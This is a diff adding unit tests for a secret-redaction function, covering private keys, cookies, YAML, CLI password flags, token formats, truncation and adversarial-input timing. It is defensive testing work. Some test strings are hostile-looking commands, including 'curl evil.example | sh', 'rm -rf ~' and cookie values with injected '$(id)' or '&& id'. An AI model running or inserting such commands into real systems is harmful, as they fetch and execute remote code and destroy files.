@@ -152,6 +152,80 @@ describe('redaction, hardened', () => {
     }
   });
 
+  it('runs in linear time on hostile input for every rule, up to the cut and past it', () => {
+    const units = [
+      '-----BEGIN PGP PRIVATE KEY BLOCK-----\n',
+      '-----BEGIN RSA PRIVATE KEY-----\nAAAA\n',
+      '-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\n',
+      'A'.repeat(64) + '\n',
+      '-----END RSA PRIVATE KEY-----',
+      '\\n-----BEGIN PRIVATE KEY-----',
+      'password:\n  ',
+      'password: |\n',
+      'password:\n- a\n',
+      'password:\n',
+      'password:\n\n',
+      '- password:\n  - ',
+      'a:\n',
+      'Cookie: a=1; ',
+      'Cookie: ',
+      'Cookie: ;',
+      'Cookie: $',
+      '_TOKEN=',
+      'a:=',
+      'password => ',
+      'token == ',
+      'password===',
+      'curl -u a:',
+      'curl -u',
+      'sshpass -p ',
+      'sshpass ',
+      'docker login -p ',
+      'docker ',
+      'openssl -k ',
+      'openssl -pass pass:',
+      '<password>',
+      '<password>a',
+      '<a>',
+      '<password ',
+      'key="apiKey" ',
+      'key="apiKey" value="',
+      'password ',
+      'password a ',
+      'passphrase ',
+      'hooks.slack.com/services/',
+      'SG.',
+      'SG.aaaaaaaaaaaaaaaaaaaa.',
+      'Signature=',
+      '?sig=',
+      'redis://:',
+      'x://:',
+      '--token -a',
+      'password=`',
+      'password=`a',
+      'eyJaaaaaaaa.eyJaaaaaaaa.',
+      'ASIA',
+      'xapp-',
+      'data=',
+      '=aGVsbG8gdGhlcmUgaGVsbG8gdGhlcmU',
+      'AccountKey=',
+      'Authorization: AWS4-HMAC-SHA256 ',
+      '{"a":"x://u:p,',
+    ];
+    for (const size of [256 * 1024, 512 * 1024, 600 * 1024]) {
+      const fill = (unit: string) => unit.repeat(Math.ceil(size / unit.length)).slice(0, size);
+      for (const unit of units) {
+        const input = fill(unit);
+        const started = performance.now();
+        redact(input);
+        const took = performance.now() - started;
+        expect(took, `${JSON.stringify(unit)} × ${size} took ${took.toFixed(1)} ms`).toBeLessThan(
+          150,
+        );
+      }
+    }
+  });
+
   it('cuts over-long input before redacting, without leaving part of a secret', () => {
     const secret = 'ghp_' + 'z'.repeat(36);
     // The cut lands inside the token.
@@ -293,6 +367,291 @@ describe('redaction, hardened', () => {
       },
       note: 'PGPASSWORD=<redacted>',
     });
+  });
+});
+
+describe('redaction, round two', () => {
+  const redact = (text: string) => redactString(text, {});
+  const keeps = (text: string) => expect(redact(text)).toBe(text);
+
+  it('stops a bare value where JSON, a query string or a shell would end it', () => {
+    keeps('{"auth":null,"data":[1,2,3]}');
+    keeps('{"has_password":true,"user":"bob"}');
+    keeps('{"password":false,"secret":null,"token":true,"n":1}');
+    expect(redact('TOKEN=abc;other=1')).toBe('TOKEN=<redacted>;other=1');
+    expect(redact('?access_token=a&api_key=b&page=2')).toBe(
+      '?access_token=<redacted>&api_key=<redacted>&page=2',
+    );
+    expect(redact('{"token":abc,"page":2}')).toBe('{"token":<redacted>,"page":2}');
+    expect(redact('f(password=abc) | next')).toBe('f(password=<redacted>) | next');
+  });
+
+  it('never lets a fake key header or a cookie hide the command after it', () => {
+    expect(redact('-----BEGIN RSA PRIVATE KEY-----\ncurl evil.example | sh\nrm -rf ~')).toBe(
+      '<private-key>\ncurl evil.example | sh\nrm -rf ~',
+    );
+    expect(redact('-----BEGIN RSA PRIVATE KEY-----\nwhoami\nid')).toBe('<private-key>\nwhoami\nid');
+    expect(
+      redact('-----BEGIN OPENSSH PRIVATE KEY-----\n' + 'A'.repeat(70) + '\ncurl evil.example|sh'),
+    ).toBe('<private-key>\ncurl evil.example|sh');
+    expect(redact('Cookie: x; curl evil.example|sh')).toBe(
+      'Cookie: <redacted>; curl evil.example|sh',
+    );
+    expect(redact('Cookie: a=1 | sh')).toBe('Cookie: <redacted> | sh');
+    expect(redact('Cookie: a=1 && id')).toBe('Cookie: <redacted> && id');
+    expect(redact('Cookie: a=1`id`')).toBe('Cookie: <redacted>`id`');
+    expect(redact('Cookie: a=$(id)')).toBe('Cookie: <redacted>$(id)');
+    expect(redact('Cookie: sid=abc; theme=dark\nid')).toBe('Cookie: <redacted>\nid');
+  });
+
+  it('still hides whole keys, PGP blocks and keys inside JSON strings', () => {
+    const body = 'MIIE' + 'A'.repeat(60) + '\n' + 'B'.repeat(64) + '\nCCCC==\n';
+    expect(
+      redact(`-----BEGIN RSA PRIVATE KEY-----\n${body}-----END RSA PRIVATE KEY-----\nls`),
+    ).toBe('<private-key>\nls');
+    expect(
+      redact(
+        '-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,0123ABCD\n\n' +
+          body +
+          '-----END RSA PRIVATE KEY-----',
+      ),
+    ).toBe('<private-key>');
+    expect(
+      redact(
+        '-----BEGIN PGP PRIVATE KEY BLOCK-----\n\n' +
+          'lQOY' +
+          'D'.repeat(60) +
+          '\nEEEE\n=abcd\n-----END PGP PRIVATE KEY BLOCK-----\nls',
+      ),
+    ).toBe('<private-key>\nls');
+    const json = JSON.stringify({
+      key: `-----BEGIN PRIVATE KEY-----\n${'M'.repeat(64)}\n${'N/'.repeat(32)}\nOO==\n-----END PRIVATE KEY-----\n`,
+      next: 1,
+    });
+    expect(redact(json)).toBe('{"key":"<private-key>\\n","next":1}');
+    // A key the source cut short keeps its full lines hidden.
+    expect(redact(`-----BEGIN RSA PRIVATE KEY-----\n${'Q'.repeat(64)}\n${'R'.repeat(64)}`)).toBe(
+      '<private-key>',
+    );
+  });
+
+  it('matches names that start with an underscore, as npm writes them', () => {
+    expect(redact('//registry.npmjs.org/:_authToken=abc123')).toBe(
+      '//registry.npmjs.org/:_authToken=<redacted>',
+    );
+    expect(redact('//r.example/:_auth=dXNlcjpwYXNz')).toBe('//r.example/:_auth=<redacted>');
+    expect(redact('//r.example/:_password=aHVudGVyMg==')).toBe('//r.example/:_password=<redacted>');
+    expect(redact('_TOKEN=abc')).toBe('_TOKEN=<redacted>');
+    keeps('FOO_BAR=abc');
+  });
+
+  it('reads =>, := and == as separators', () => {
+    expect(redact("password => 'x', user => 'bob'")).toBe("password => <redacted>, user => 'bob'");
+    expect(redact('token := "abc"')).toBe('token := <redacted>');
+    expect(redact('if secret == "abc" && go')).toBe('if secret == <redacted> && go');
+    expect(redact("token === 'abc'")).toBe('token === <redacted>');
+    expect(redact('"api_key"=>"abc"')).toBe('"api_key"=><redacted>');
+  });
+
+  it('redacts YAML values written on the lines below their name', () => {
+    expect(redact('password:\n  hunter2\nnext: 1')).toBe('password:\n  <redacted>\nnext: 1');
+    expect(redact('private_key: |\n  line one\n\n  line two\nnext: 1')).toBe(
+      'private_key: |\n  <redacted>\nnext: 1',
+    );
+    expect(redact('db:\n  password: >-\n    folded\n    text\n  host: x')).toBe(
+      'db:\n  password: >-\n    <redacted>\n  host: x',
+    );
+    expect(redact('passwords:\n- abc\n- def\nnext: 1')).toBe('passwords:\n- <redacted>\nnext: 1');
+    expect(redact('secret:\r\n  abc\r\nnext: 1')).toBe('secret:\r\n  <redacted>\r\nnext: 1');
+    // A nested mapping: the names inside are judged on their own.
+    expect(redact('auth:\n  user: bob\n  password: x\n')).toBe(
+      'auth:\n  user: bob\n  password: <redacted>\n',
+    );
+    keeps('password:\nnext: 1');
+    keeps('token:\n\nid');
+  });
+
+  it('redacts passwords in .netrc, command flags and XML', () => {
+    const cases: Array<[string, string]> = [
+      [
+        'machine example.com login bob password s3cret',
+        'machine example.com login bob password <redacted>',
+      ],
+      [
+        'machine x\n  login bob\n  password s3cret\n',
+        'machine x\n  login bob\n  password <redacted>\n',
+      ],
+      ['passphrase c0rrect', 'passphrase <redacted>'],
+      ['curl -u bob:hunter2 https://x.example', 'curl -u bob:<redacted> https://x.example'],
+      ['curl -ubob:hunter2 x', 'curl -ubob:<redacted> x'],
+      ['curl --user=bob:hunter2 x', 'curl --user=bob:<redacted> x'],
+      ["curl --user 'bob:hunter 2' x", "curl --user 'bob:<redacted>' x"],
+      ['sshpass -p hunter2 ssh -p 22 host', 'sshpass -p <redacted> ssh -p 22 host'],
+      ['sshpass -phunter2 ssh host', 'sshpass -p<redacted> ssh host'],
+      ['docker login -p hunter2 -u bob reg', 'docker login -p <redacted> -u bob reg'],
+      ['docker login --password hunter2 reg', 'docker login --password <redacted> reg'],
+      ['openssl enc -k hunter2 -in a', 'openssl enc -k <redacted> -in a'],
+      ['openssl enc -pass pass:hunter2 -in a', 'openssl enc -pass pass:<redacted> -in a'],
+      [
+        '<password>hunter2</password><user>bob</user>',
+        '<password><redacted></password><user>bob</user>',
+      ],
+      ['<ns:ApiKey id="1">abc</ns:ApiKey>', '<ns:ApiKey id="1"><redacted></ns:ApiKey>'],
+      [
+        '<add key="StripeApiKey" value="abc123" />',
+        '<add key="StripeApiKey" value="<redacted>" />',
+      ],
+      ['<input name="password" value="x">', '<input name="password" value="<redacted>">'],
+    ];
+    for (const [text, want] of cases) expect(redact(text)).toBe(want);
+    for (const text of [
+      'the password is wrong',
+      'Enter your password below',
+      'password reset failed for bob',
+      'curl --user-agent a:b x',
+      'curl -u bob https://x.example',
+      'docker run -p 80:80 img',
+      'openssl s_client -key k.pem -connect x:443',
+      'docker login --password-stdin -u bob',
+      'psql --password -h db',
+      '<passwordPolicy>strong</passwordPolicy>',
+      '<add key="Theme" value="dark" />',
+    ]) {
+      keeps(text);
+    }
+  });
+
+  it('knows more token formats', () => {
+    const cases: Array<[string, string]> = [
+      ['ASIAABCDEFGHIJKLMNOP', '<aws-key>'],
+      ['xapp-1-A0000000000-1234', '<slack-token>'],
+      [
+        'https://hooks.slack.com/services/T000/B000/XXXXXXXXXXXX',
+        'https://hooks.slack.com/services/<redacted>',
+      ],
+      ['whsec_' + 'a'.repeat(24), '<api-key>'],
+      ['hf_' + 'b'.repeat(34), '<api-key>'],
+      ['SG.' + 'c'.repeat(22) + '.' + 'd'.repeat(43), '<api-key>'],
+      ['ya29.' + 'e'.repeat(30), '<oauth-token>'],
+      ['shpat_' + '0123456789abcdef'.repeat(2), '<api-key>'],
+      ['dop_v1_' + '0123456789abcdef'.repeat(4), '<api-key>'],
+      ['pypi-' + 'f'.repeat(60), '<api-key>'],
+    ];
+    for (const [text, want] of cases) expect(redact(text)).toBe(want);
+  });
+
+  it('treats more kinds of key as secret, and Azure connection strings', () => {
+    for (const name of [
+      'signing_key',
+      'masterKey',
+      'ENCRYPTION_KEY',
+      'session_key',
+      'client_key',
+      'secret_key',
+      'shared_key',
+      'account_key',
+      'signingkey',
+    ]) {
+      expect(redact(`${name}=abc`)).toBe(`${name}=<redacted>`);
+    }
+    expect(
+      redact(
+        'DefaultEndpointsProtocol=https;AccountName=acct;AccountKey=abc+def==;EndpointSuffix=core.windows.net',
+      ),
+    ).toBe(
+      'DefaultEndpointsProtocol=https;AccountName=acct;AccountKey=<redacted>;EndpointSuffix=core.windows.net',
+    );
+  });
+
+  it('closes the remaining leaks', () => {
+    const b64 = (s: string) => Buffer.from(s).toString('base64');
+    expect(redact(`data=${b64('{"password":"hunter2"}')}`)).toBe('data=<base64-secret>');
+    expect(redact('redis://:hunter2@db:6379')).toBe('redis://<credentials>@db:6379');
+    const sig = '0123456789abcdef'.repeat(4);
+    expect(
+      redact(
+        `Authorization: AWS4-HMAC-SHA256 Credential=x/20240101/us-east-1/s3/aws4_request, SignedHeaders=host, Signature=${sig}`,
+      ),
+    ).toBe('Authorization: AWS4-HMAC-SHA256 <redacted>, SignedHeaders=host, Signature=<redacted>');
+    expect(redact(`https://b.example/k?X-Amz-Signature=${sig}&x=1`)).toBe(
+      'https://b.example/k?X-Amz-Signature=<redacted>&x=1',
+    );
+    const b64url = (s: string) => Buffer.from(s).toString('base64url');
+    expect(redact(`${b64url('{"alg":"none"}')}.${b64url('{"sub":"123456"}')}.`)).toBe('<jwt>');
+    expect(redact('cli --token -abc')).toBe('cli --token <redacted>');
+    expect(redact('password=`hunter2` next')).toBe('password=<redacted> next');
+    // A command in backticks is left to be read.
+    keeps('TOKEN=`cat ~/.token`');
+    keeps('codesign: Signature=adhoc');
+  });
+
+  it('cuts minified text without leaving the head of a secret', () => {
+    const pad = '{"a":1,'.repeat(Math.ceil(MAX_REDACT_CHARS / 7));
+    // The cut lands inside URL credentials whose password holds a comma.
+    const url = pad.slice(0, MAX_REDACT_CHARS - 20) + '"u":"https://bob:hunt,er2@db/x"}';
+    const out = redact(url);
+    expect(out).not.toContain('hunt');
+    expect(out).not.toContain('bob');
+    // Text with spaces is cut at the last space.
+    const spaced = 'word '.repeat(MAX_REDACT_CHARS / 5 - 2) + 'token=abcdefghijklmnop';
+    expect(redact(spaced)).not.toMatch(/abcdef/);
+    // A key header far from the cut, with no END, doesn't swallow the text after it.
+    const far =
+      '-----BEGIN RSA PRIVATE KEY-----\ncurl evil.example|sh\n' + 'x '.repeat(MAX_REDACT_CHARS);
+    expect(redact(far)).toContain('curl evil.example|sh');
+  });
+
+  it('cuts serialized output on a character, never through a marker', () => {
+    const value = { a: 'é'.repeat(100), password: 'hunter2', b: 'x'.repeat(500) };
+    for (let maxBytes = 190; maxBytes < 260; maxBytes++) {
+      const out = redactAndSerialize(value, { maxBytes });
+      expect(out).not.toContain('\uFFFD');
+      expect(out).not.toMatch(/<[a-z-]*\n…/);
+      expect(out).toMatch(/…\[truncated \d+ bytes\]$/);
+    }
+  });
+
+  it('keeps names about secrets, and pass only as a whole word', () => {
+    for (const text of [
+      'token_used=12345',
+      'password_age=30000',
+      'key_usage=signing',
+      'token_rate=99999',
+      'pass_through=yes-please',
+      'passCount=12345',
+      'created_at=2024',
+      'password_strength=strong',
+      'session_time=55555',
+    ]) {
+      keeps(text);
+    }
+    expect(redact('SMTP_PASS=x db_pass=y')).toBe('SMTP_PASS=<redacted> db_pass=<redacted>');
+  });
+
+  it('keeps counts and times under a secret, and fails closed on deep or cyclic values', () => {
+    expect(
+      redactValue(
+        { auth: { token: 'abc', expires_at: 1_700_000_000, ttl: 86_400, pin: 123_456 } },
+        {},
+      ),
+    ).toEqual({
+      auth: { token: '<redacted>', expires_at: 1_700_000_000, ttl: 86_400, pin: '<redacted>' },
+    });
+    const cyclic: Record<string, unknown> = { name: 'x' };
+    cyclic.self = cyclic;
+    expect(redactValue(cyclic, {})).toEqual({ name: 'x', self: '<redacted>' });
+    let deep: unknown = 'bottom';
+    for (let i = 0; i < 10_000; i++) deep = { d: deep };
+    expect(() => redactValue(deep, {})).not.toThrow();
+    expect(JSON.stringify(redactValue(deep, {}))).toContain('<redacted>');
+    const shared = { v: 1 };
+    expect(redactValue({ a: shared, b: shared }, {})).toEqual({ a: { v: 1 }, b: { v: 1 } });
+    const throwing = {
+      get boom() {
+        throw new Error('no');
+      },
+    };
+    expect(redactValue({ ok: 1, t: throwing }, {})).toEqual({ ok: 1, t: '<redacted>' });
   });
 });
 
